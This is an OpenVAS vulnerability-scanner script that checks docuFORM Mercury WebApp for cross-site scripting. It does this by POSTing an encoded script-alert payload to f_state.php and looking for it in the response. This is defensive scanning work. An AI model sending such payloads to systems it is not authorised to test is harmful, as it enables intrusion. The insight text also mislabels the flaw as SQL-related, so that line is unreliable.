###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_docuform_mercury_webapp_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# docuFORM Mercury WebApp Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to cause Cross-Site Scripting
  by executing arbitrary codes with in the context of the affected application.
  Impact Level: Application.";
tag_affected = "Mercury Web Application version 6.16a and 5.20";
tag_insight = "Input passed to the 'this_url' and 'aa_sfunc' parameters in
  f_state.php,f_list.php, f_job.php and f_header.php, is not properly
  sanitised before being used in SQL queries.";
tag_solution = "No solution or patch is available as of 25th April 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.docuform.de";
tag_summary = "This host is running docuFORM Mercury WebApplication is prone to
  multiple cross-site scripting vulnerabilities.";

if(description)
{
  script_id(902414);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-05-02 12:20:04 +0200 (Mon, 02 May 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("docuFORM Mercury WebApp Multiple Cross-Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5010.php");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/100625/ZSL-2011-5010.txt");

  script_description(desc);
  script_summary("Confirm the cross-site scripting vulnerability in docuFORM Mercury WebApp");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

##  Get the default port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

sndReq = http_get(item:"/Mercury/login.php", port:port);
rcvRes = http_send_recv(port:port, data:sndReq);

## Confirm the application
if("<title>Mercury</title>" >< rcvRes)
{
  filename = "/Mercury/f_state.php";
  host = get_host_name();

  ## Construct the attack string
  authVariables = "aa_afunc=call&aa_sfunc=1%3Cscript%3Ealert%28%27XSS-ATTACK" +
                  "%27%29%3C%2Fscript%3E&aa_cfunc=OnAgentGetDeviceList&aa_sf" +
                  "unc_args%255B%255D=0";
  sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
                  "Content-Type: application/x-www-form-urlencoded\r\n",
                  "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                  authVariables);
  ## Send the constructed attack string
  rcvRes = http_send_recv(port:port, data:sndReq);

  ## Confirm the exploit by response
  if("<script>alert('XSS-ATTACK')</script>" >< rcvRes){
    security_warning(port);
  }
}
